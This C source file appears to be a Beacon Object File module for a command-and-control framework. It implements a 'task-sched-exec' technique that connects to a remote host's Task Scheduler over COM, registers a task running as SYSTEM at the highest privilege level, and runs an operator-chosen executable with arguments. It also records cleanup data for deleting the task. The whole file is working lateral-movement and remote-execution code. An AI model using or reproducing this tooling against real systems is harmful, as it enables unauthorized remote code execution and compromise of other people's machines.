#define COBJMACROS

#include <oleauto.h>
#include <taskschd.h>
#include <windows.h>

#include "beacon.h"
#include "rex.h"
#include "technique.h"

REX_DEFINE_TECHNIQUE(rex_tasksched, "task-sched-exec",
                     "task_scheduler_name_available", "task_scheduler_run",
                     REX_DISPOSITION_DISPATCHED);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN,
                                                      DWORD, REFIID, LPVOID *);
DECLSPEC_IMPORT BSTR WINAPI OLEAUT32$SysAllocString(const OLECHAR *);
DECLSPEC_IMPORT void WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG *);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

static const CLSID rex_clsid_task_scheduler = {
    0x0f87369f,
    0xa4e5,
    0x4cfc,
    {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
static const IID rex_iid_task_service = {
    0x2faba4c7,
    0x4da9,
    0x4013,
    {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
static const IID rex_iid_exec_action = {
    0x4c3d624d,
    0xfd6b,
    0x49a3,
    {0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47}};

typedef struct {
    ITaskService *service;
    ITaskFolder *folder;
    BSTR task_name;
    BOOL registered;
    BOOL uninitialize_com;
} rex_task_state;

static void rex_empty_variant(VARIANT *value) {
    rex_zero(value, sizeof(*value));
}

static HRESULT rex_task_connect(const rex_request *request,
                                rex_task_state **out) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    rex_task_state *state = (rex_task_state *)KERNEL32$HeapAlloc(
        heap, HEAP_ZERO_MEMORY, sizeof(*state));
    wchar_t target[REX_MAX_TARGET + 1];
    BSTR target_value = NULL;
    BSTR root = NULL;
    VARIANT server, empty;
    IRegisteredTask *collision = NULL;
    HRESULT result;
    *out = NULL;
    if (state == NULL) {
        return E_OUTOFMEMORY;
    }
    result = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (result == S_OK || result == S_FALSE) {
        state->uninitialize_com = TRUE;
    } else if (result != RPC_E_CHANGED_MODE) {
        goto cleanup;
    }
    result =
        OLE32$CoCreateInstance(&rex_clsid_task_scheduler, NULL,
                               CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER,
                               &rex_iid_task_service, (void **)&state->service);
    if (FAILED(result)) {
        goto cleanup;
    }
    if (!toWideChar((char *)request->target, target, sizeof(target))) {
        result = E_INVALIDARG;
        goto cleanup;
    }
    target_value = OLEAUT32$SysAllocString(target);
    if (target_value == NULL) {
        result = E_OUTOFMEMORY;
        goto cleanup;
    }
    rex_empty_variant(&server);
    rex_empty_variant(&empty);
    V_VT(&server) = VT_BSTR;
    V_BSTR(&server) = target_value;
    result = ITaskService_Connect(state->service, server, empty, empty, empty);
    if (FAILED(result)) {
        goto cleanup;
    }
    root = OLEAUT32$SysAllocString(L"\\");
    state->task_name = OLEAUT32$SysAllocString(request->config.task.name);
    if (root == NULL || state->task_name == NULL) {
        result = E_OUTOFMEMORY;
        goto cleanup;
    }
    result = ITaskService_GetFolder(state->service, root, &state->folder);
    if (FAILED(result)) {
        goto cleanup;
    }
    result = ITaskFolder_GetTask(state->folder, state->task_name, &collision);
    if (SUCCEEDED(result)) {
        result = HRESULT_FROM_WIN32(ERROR_ALREADY_EXISTS);
        goto cleanup;
    }
    if (result != HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND))
        goto cleanup;
    result = S_OK;

cleanup:
    if (collision != NULL) {
        IRegisteredTask_Release(collision);
    }
    if (root != NULL) {
        OLEAUT32$SysFreeString(root);
    }
    if (target_value != NULL) {
        OLEAUT32$SysFreeString(target_value);
    }
    if (FAILED(result)) {
        if (state->folder != NULL)
            ITaskFolder_Release(state->folder);
        if (state->service != NULL)
            ITaskService_Release(state->service);
        if (state->task_name != NULL)
            OLEAUT32$SysFreeString(state->task_name);
        if (state->uninitialize_com)
            OLE32$CoUninitialize();
        KERNEL32$HeapFree(heap, 0, state);
        return result;
    }
    *out = state;
    return S_OK;
}

static HRESULT rex_task_register_and_run(rex_task_state *state,
                                         const rex_task_config *config) {
    ITaskDefinition *definition = NULL;
    IPrincipal *principal = NULL;
    IActionCollection *actions = NULL;
    IAction *action = NULL;
    IExecAction *exec = NULL;
    IRegisteredTask *registered = NULL;
    IRunningTask *running = NULL;
    BSTR system = NULL, path = NULL, arguments = NULL;
    VARIANT user, empty;
    HRESULT result;
    rex_empty_variant(&user);
    rex_empty_variant(&empty);
    system = OLEAUT32$SysAllocString(L"SYSTEM");
    path = OLEAUT32$SysAllocString(config->executable);
    arguments = OLEAUT32$SysAllocString(config->arguments);
    if (system == NULL || path == NULL || arguments == NULL) {
        result = E_OUTOFMEMORY;
        goto cleanup;
    }
    result = ITaskService_NewTask(state->service, 0, &definition);
    if (FAILED(result))
        goto cleanup;
    result = ITaskDefinition_get_Principal(definition, &principal);
    if (FAILED(result))
        goto cleanup;
    result = IPrincipal_put_UserId(principal, system);
    if (FAILED(result))
        goto cleanup;
    result = IPrincipal_put_LogonType(principal, TASK_LOGON_SERVICE_ACCOUNT);
    if (FAILED(result))
        goto cleanup;
    result = IPrincipal_put_RunLevel(principal, TASK_RUNLEVEL_HIGHEST);
    if (FAILED(result))
        goto cleanup;
    result = ITaskDefinition_get_Actions(definition, &actions);
    if (FAILED(result))
        goto cleanup;
    result = IActionCollection_Create(actions, TASK_ACTION_EXEC, &action);
    if (FAILED(result))
        goto cleanup;
    result =
        IAction_QueryInterface(action, &rex_iid_exec_action, (void **)&exec);
    if (FAILED(result))
        goto cleanup;
    result = IExecAction_put_Path(exec, path);
    if (FAILED(result))
        goto cleanup;
    result = IExecAction_put_Arguments(exec, arguments);
    if (FAILED(result))
        goto cleanup;
    V_VT(&user) = VT_BSTR;
    V_BSTR(&user) = system;
    result = ITaskFolder_RegisterTaskDefinition(
        state->folder, state->task_name, definition, TASK_CREATE, user, empty,
        TASK_LOGON_SERVICE_ACCOUNT, empty, &registered);
    if (FAILED(result))
        goto cleanup;
    state->registered = TRUE;
    result = IRegisteredTask_Run(registered, empty, &running);

cleanup:
    if (running != NULL)
        IRunningTask_Release(running);
    if (registered != NULL)
        IRegisteredTask_Release(registered);
    if (exec != NULL)
        IExecAction_Release(exec);
    if (action != NULL)
        IAction_Release(action);
    if (actions != NULL)
        IActionCollection_Release(actions);
    if (principal != NULL)
        IPrincipal_Release(principal);
    if (definition != NULL)
        ITaskDefinition_Release(definition);
    if (arguments != NULL)
        OLEAUT32$SysFreeString(arguments);
    if (path != NULL)
        OLEAUT32$SysFreeString(path);
    if (system != NULL)
        OLEAUT32$SysFreeString(system);
    return result;
}

static HRESULT rex_tasksched_decode(const rex_arguments *arguments,
                                    rex_request *request) {
    if (arguments->values[0][0] == L'\0' || arguments->values[1][0] == L'\0') {
        return E_INVALIDARG;
    }
    request->config.task.name = arguments->values[0];
    request->config.task.executable = arguments->values[1];
    request->config.task.arguments = arguments->values[2];
    return S_OK;
}

static HRESULT rex_tasksched_preflight(const rex_request *request,
                                       rex_state *state) {
    rex_task_state *task = NULL;
    HRESULT result = rex_task_connect(request, &task);
    if (SUCCEEDED(result))
        state->private_data = task;
    return result;
}

static HRESULT rex_tasksched_execute(const rex_request *request,
                                     rex_state *state,
                                     rex_observation *observation) {
    rex_task_state *task = (rex_task_state *)state->private_data;
    HRESULT result = rex_task_register_and_run(task, &request->config.task);
    if (task->registered) {
        observation->recovery.kind = REX_RECOVERY_DELETE_TASK;
        observation->recovery.value.task.name = request->config.task.name;
        observation->recovery.value.task.executable =
            request->config.task.executable;
    }
    return result;
}

static void rex_tasksched_release(rex_state *generic) {
    rex_task_state *state = (rex_task_state *)generic->private_data;
    HANDLE heap;
    if (state == NULL)
        return;
    if (state->folder != NULL)
        ITaskFolder_Release(state->folder);
    if (state->service != NULL)
        ITaskService_Release(state->service);
    if (state->task_name != NULL)
        OLEAUT32$SysFreeString(state->task_name);
    if (state->uninitialize_com)
        OLE32$CoUninitialize();
    heap = KERNEL32$GetProcessHeap();
    KERNEL32$HeapFree(heap, 0, state);
    generic->private_data = NULL;
}
